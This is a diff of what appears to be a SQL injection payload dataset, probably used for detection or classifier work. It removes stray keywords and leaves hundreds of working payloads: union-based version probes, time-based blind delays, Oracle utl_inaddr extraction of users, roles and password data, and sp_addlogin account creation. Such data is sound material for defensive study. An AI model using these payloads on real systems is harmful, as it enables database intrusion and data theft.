@@ -16,7 +16,6 @@ AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( S
 select * from users where id = '1' %!<@ union select 1,version ( ) -- 1'
 select * from users where id = 1 or "& ( " or 1 = 1 -- 1
 select * from users where id = 1 or "? ( " or 1 = 1 -- 1
-distinct
 select * from users where id = '1' * ( \ ) or 1 = 1 -- 1'
 1 and ascii ( lower ( substring ( ( select top 1 name from sysobjects where xtype = 'u' ) , 1, 1 ) ) ) > 116
 select * from users where id = 1 or \.<\ or 1 = 1 -- 1
@@ -49,7 +48,6 @@ or 1 --'
 select * from users where id = 1 or ",;" or 1 = 1 -- 1
 admin" or 1 = 1#
 select * from users where id = 1 + ( 1 ) union select null,banner from v$version where rownum = 1 -- 1
-\x27UNION SELECT
 select * from users where id = '1' union select ( \. ) ,@@VERSION -- 1'
 or 1 = 1--
 1 or pg_sleep ( __TIME__ ) --
@@ -66,7 +64,6 @@ select * from users where id = 1 <@.$ or 1 = 1 -- 1
 select * from users where id = 1 or "%." or 1 = 1 -- 1
 select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1
 select * from users where id = 1 or ",." or 1 = 1 -- 1
-char%4039%41%2b%40SELECT
 select * from users where id = 1 or "1&" or 1 = 1 -- 1
 admin' ) or ( '1' = '1
 declare @s varchar ( 200 ) select @s = 0x73656c6 ...
@@ -84,7 +81,6 @@ select * from users where id = 1 or 1#"? or 1 = 1 -- 1
 select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 4 ) ) AND 'i' = 'i
 select * from users where id = '1' union select ( \ ) ,@@VERSION -- 1'
-1 and user_name ( ) = 'dbo'
 ; if not ( substring ( ( select @@version ) ,24,1 ) <> 1 ) waitfor delay '0:0:2' --
 select * from users where id = 1 or 1#"$ union select 1,version ( ) -- 1
 select * from users where id = 1 or 1#"{ union select null,version ( ) -- 1
@@ -187,7 +183,6 @@ select * from users where id = '1' or ""<@ union select 1,version ( ) -- 1'
 select * from users where id = 1 or "?," or 1 = 1 -- 1
 select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'
 1 or benchmark ( 10000000,MD5 ( 1 ) ) #
-procedure
 or '' = '
 AND 1 = utl_inaddr.get_host_address ( ( SELECT SYS.LOGIN_USER FROM DUAL ) ) AND 'i' = 'i
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 2 ) ) AND 'i' = 'i
@@ -264,7 +259,6 @@ a' --
 or 1 = 1 /*
 select * from users where id = 1 or 1#", union select null,version ( ) -- 1
 select * from users where id = '1' union select $ .,@@VERSION -- 1'
---
 exec sp_addlogin 'name' , 'password'
 select * from users where id = 1 union select null,banner from v$version where rownum = 1 -- 1
 0x77616974666F722064656C61792027303A303A31302700 exec ( @s )
@@ -333,7 +327,6 @@ select * from users where id = 1 or " ) ]" or 1 = 1 -- 1
 AND 1 = utl_inaddr.get_host_address ( ( SELECT COUNT ( DISTINCT ( column_name ) ) FROM sys.all_tab_columns ) ) AND 'i' = 'i
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( table_name ) FROM ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables ) WHERE LIMIT = 7 ) ) AND 'i' = 'i
 " or "" "
-delete
 ;waitfor delay '0:0:__TIME__'--
 1' and non_existant_table = '1
 select * from users where id = 1 or "& ) " or 1 = 1 -- 1
@@ -386,7 +379,6 @@ uni/**/on sel/**/ect
 ) ) ;waitfor delay '0:0:__TIME__'--
 select * from users where id = 1 or "?;" or 1 = 1 -- 1
 1 waitfor delay '0:0:10'--
-bfilename
 admin' ) or ( '1' = '1'--
 -- &password =
 1 or sleep ( __TIME__ ) #
@@ -450,7 +442,6 @@ select * from users where id = 1 + $+%1 or 1 = 1 -- 1
 select * from users where id = 1. union select version ( ) ,version ( ) -- 1
 x' AND email IS NULL; --
 select * from users where id = '1' + @ @1 union select 1,version ( ) -- 1'
---
 select * from users where id = '1' union select null,banner from v$version where rownum = 1 -- 1'
 select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1
 select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1
@@ -547,7 +538,6 @@ select * from users where id = 1 % ( $ ) or 1 = 1 -- 1
 select * from users where id = 1 or 1#" ( union select 'a',version ( ) -- 1
 select * from users where id = 1 or "{ ) " or 1 = 1 -- 1
 select * from users where id = 1 or "1[" or 1 = 1 -- 1
-desc
 select * from users where id = 1 or ", ) " = 1 or 1 = 1 -- 1
 anything' or 'x' = 'x
 select * from users where id = 1 or 1#"1 union select 1,version ( ) -- 1
@@ -706,9 +696,7 @@ select * from users where id = '1' + ( \ ) union select 1,@@VERSION -- 1'
 union select
 select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1
 select * from users where id = '1' or $<\ or 1 = 1 -- 1'
-or
 x' AND members.email IS NULL; --
-select
 " or 1 = 1--
 a' or 'a' = 'a
 select * from users where id = '1' <@._ union select 1,version ( ) -- 1'
@@ -743,7 +731,6 @@ select * from users where id = 1 or \.<\ union select 1,@@VERSION -- 1
 select * from users where id = 1 or @#"{ = 1 or 1 = 1 -- 1
 hi' or 'a' = 'a
 or ''*'
-sqlattempt1
 admin' or 1 = 1--
 select * from users where id = 1 or "%;" or 1 = 1 -- 1
 1' or '1' = '1
@@ -757,19 +744,15 @@ select * from users where id = 1 or 1#", union select 1,version ( ) -- 1
 select * from users where id = 1 or 1#"1 union select version ( ) ,version ( ) -- 1
 AND 1 = utl_inaddr.get_host_address ( ( SELECT COUNT ( DISTINCT ( PASSWORD ) ) FROM SYS.USER$ ) ) AND 'i' = 'i
 select * from users where id = '1' or ( \ ) = 1 union select 1,@@VERSION -- 1'
-order by
 select * from users where id = 1 or !<@ or 1 = 1 -- 1
 or username is not NULL or username = '
 admin' or '1' = '1'/*
-//*
 select * from users where id = 1 or ( \+ ) = 1 union select 1,@@VERSION -- 1
 select * from users where id = 1 <@. union select version ( ) ,version ( ) -- 1
 select * from users where id = 1 or "; ) " = 1 or 1 = 1 -- 1
 select * from users where id = '1' + ( \. ) union select 1,@@VERSION -- 1'
 <>"'%; ) ( &+
 and 1 = 0 ) union all
-or a = a--
-0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A
 select * from users where id = 1 union select 1 $$,version ( ) -- 1
 select * from users where id = 1 or ( 1 ) = 1 union select 1,banner from v$version where rownum = 1 -- 1
 or 'text' = n'text'
@@ -783,25 +766,19 @@ select * from users where id = '1' or \<\. union select 1,@@VERSION -- 1'
 select * from users where id = 1 or ",?" or 1 = 1 -- 1
 select * from users where id = '1' or ( 1 ) = 1 union select 1,banner from v$version where rownum = 1 -- 1'
 "a"" or 3 = 3--"
-admin' --
 select * from users where id = 1 +1 or 1 = 1 -- 1
-having
 ) ) or benchmark ( 10000000,MD5 ( 1 ) ) #
 select * from users where id = 1 or "\#" or 1 = 1 -- 1
 or '7659' = '7659
 select * from users where id = 1 or 1#"; union select version ( ) ,version ( ) -- 1
 select * from users where id = 1 or "1 ) " or 1 = 1 -- 1
 1 or 1 = 1
-"*"
-replace
 select * from users where id = 1 or @`\` union select 1,version ( ) -- 1
 select * from users where id = 1 or "_{" or 1 = 1 -- 1
 select * from users where id = 1 -@<@ union select null,version ( ) -- 1
 select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1
-"^"
 * ( | ( objectclass = * ) )
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 4 ) ) AND 'i' = 'i
-limit
 or 1 = 1#
 select * from users where id = 1 or "{%" or 1 = 1 -- 1
 AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 7 ) ) AND 'i' = 'i
@@ -4186,7 +4163,6 @@ select ( case when ( 3716 = 4021 ) then 3716 else 3716* ( select 3716 from infor
 1 ) where 7096 = 7096
 -3166'|| ( select 'mtan' from dual where 9420 = 9420 union all select 9420#
 1 ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( 3069 = 3069
-1
 1 where 4787 = 4787
 1' ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )
 -4635" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#
@@ -5428,7 +5404,6 @@ iif ( 1378 = 6569,1,1/0 )
 1%" ) ) ) waitfor delay '0:0:5' and ( ( ( "%" = "
 1' ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( 'gydh' = 'gydh
 1' union all select null,null,null,null,null,null,null--
-5739-5738
 -7296%' ) ) ) union all select 9322,9322,9322,9322--
 select ( case when ( 7033 = 1594 ) then 7033 else 7033* ( select 7033 from information_schema.character_sets ) end ) #
 1" and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and "qzzg" like "qzzg
@@ -5647,7 +5622,6 @@ select sleep ( 5 ) and ( ( ( 'qjsc' = 'qjsc
 1' ) as hvyx where 3194 = 3194 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --
 -3343'|| ( select 'ssvt' where 5179 = 5179 union all select 5179,5179,5179,5179,5179,5179,5179,5179--
 -9432 ) ) as nqya where 8387 = 8387 or elt ( 9242 = 6180,6180 ) --
-)
 1, ( select ( case when ( 2970 = 5830 ) then 1 else 2970* ( select 2970 from mysql.db ) end ) )
 -3424' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 'dyuo' = 'dyuo
 -4176'+ ( select 'muio' where 4256 = 4256 union all select 4256,4256,4256,4256,4256,4256#
@@ -5818,7 +5792,6 @@ select ( case when ( 9746 = 8055 ) then 9746 else 1/ ( select 0 ) end ) --
 -1079" ) where 2865 = 2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#
 ( select ( case when ( 5792 = 5792 ) then 5792 else 1/ ( select 0 ) end ) )
 -6377' or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'qcms' like 'qcms
-end
 -1894' ) union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#
 1%' ) ) ) union all select null--
 1 ) ) order by 1--
@@ -7472,7 +7445,6 @@ select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) ) ||'
 1" ) as dgzf where 4834 = 4834
 -4324 order by 1--
 -8557 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #
-end--
 1" ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( "ugtw" = "ugtw
 1 ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( 4279 = 4279
 1%' ) ) rlike sleep ( 5 ) #
